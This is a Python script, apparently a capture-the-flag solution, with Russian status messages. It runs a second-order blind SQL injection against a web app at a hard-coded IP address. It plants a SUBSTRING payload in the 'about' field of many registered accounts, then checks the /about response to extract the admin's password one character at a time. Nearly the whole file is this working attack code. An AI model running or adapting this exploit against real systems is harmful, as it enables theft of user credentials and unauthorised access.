import requests
import string
import time


def fetch_register(base_url: str, username: str, password: str, about: str):
    req_data = {
            'username': username,
            'password': password,
            'about': about
    }
    return requests.post(f'{base_url}/register', data=req_data)


def login(base_url: str, username: str, password: str):
    session = requests.Session()
    req_data = {
            'username': username,
            'password': password
    }
    response = session.post(f'{base_url}/login', data=req_data)
    return session if response.status_code == 200 else None


def check_about(base_url: str, session: requests.Session):
    try:
        response = session.get(f'{base_url}/about')
        return response.json().get('about') == '1'
    except:
        return False


if __name__ == '__main__':
    base_url = 'http://62.173.140.174:16068'
    symbols = string.ascii_letters + string.digits
    username = 'Alexxx{0}'
    password = '123456789'
    injection = "xyz' OR SUBSTRING((SELECT password FROM users WHERE username='admin'), {0}, 1) = '{1}"
    user_index = 1;
    substr_index = 1;
    found_password = ''

    while True:
        for s in symbols:
            print(f'[ ] Пробуем символ: "{s}" на позиции {substr_index}')

            fetch_register(base_url, username.format(user_index), password, injection.format(substr_index, s))
            session = login(base_url, username.format(user_index), password)

            if session and check_about(base_url, session):
                found_password += s
                print(f'[+] Найден символ: {s}')
                print(f'[+] Текущий пароль: {found_password}')
                substr_index += 1
                user_index += 1
                break

            user_index += 1
